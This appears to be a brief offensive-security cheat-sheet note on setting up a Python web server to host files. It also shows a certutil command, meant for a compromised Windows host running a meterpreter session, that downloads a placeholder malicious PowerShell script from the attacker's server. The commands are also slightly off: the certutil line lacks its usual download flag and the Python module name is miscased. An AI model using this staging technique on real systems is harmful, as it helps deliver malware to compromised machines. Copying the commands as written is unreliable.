# Creating Python Webserver

useful to quickly create to serve files

```bash
python -m SimpleHttpServer $PORT
```

Download file from meterpreter in Windows session:

```bash
certutil -f http://$PYTHON_SERVER:80/$MALICIOUS_FILE.ps1 mal_file.ps1
```
